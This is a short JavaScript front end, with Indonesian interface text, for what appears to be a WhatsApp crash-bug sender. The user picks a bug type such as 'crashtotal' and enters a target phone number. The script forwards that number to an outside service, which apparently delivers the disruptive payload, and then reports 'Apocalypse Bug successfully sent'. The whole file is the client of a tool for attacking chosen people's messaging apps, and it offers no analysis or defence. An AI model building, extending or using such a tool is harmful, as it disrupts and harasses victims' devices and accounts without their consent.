let selectedBug = "crashtotal";

document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

function showPopup(message) {
  document.getElementById("popup-message").innerHTML = message;
  document.getElementById("popup").style.display = "flex";
}

function closePopup() {
  document.getElementById("popup").style.display = "none";
}

async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
    resDiv.innerText = "Masukkan nomor WA yang valid!";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    const json = await res.json();
    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
  } catch (err) {
    resDiv.innerText = "❌ Gagal fetch: " + err;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}